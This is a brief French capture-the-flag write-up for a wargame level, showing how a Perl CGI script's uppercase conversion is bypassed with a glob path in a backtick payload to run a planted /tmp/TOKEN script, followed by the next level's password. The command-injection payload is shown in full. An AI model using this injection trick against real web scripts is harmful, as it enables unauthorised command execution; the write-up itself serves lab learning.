## 1. Analyser le fichier perl

    curl http://localhost:6464/level12.pl?x=test

Cela exécute le script Perl et affiche des informations dans la console. En examinant le fichier, on remarque qu'il existe une vulnérabilité permettant d'exécuter une commande dans egrep. Le premier argument est transformé en majuscule, ce qui ouvre ensuite le fichier correspondant.

## 2. Creer un fichier possible a ouvrir pour perl

On crée un fichier nommé TOKEN dans le répertoire /tmp et y insère la commande getflag, qui redirige ensuite le résultat vers un autre fichier.

    echo 'getflag > /tmp/token' > /tmp/TOKEN

## 2. Executer le script avec la commande cache

    curl http://localhost:4646?x='`/*/TOKEN`'

## 3. Connexion

su level13

    Mot de passe : g1qKMiRpXf53AWhDaU7FEkczr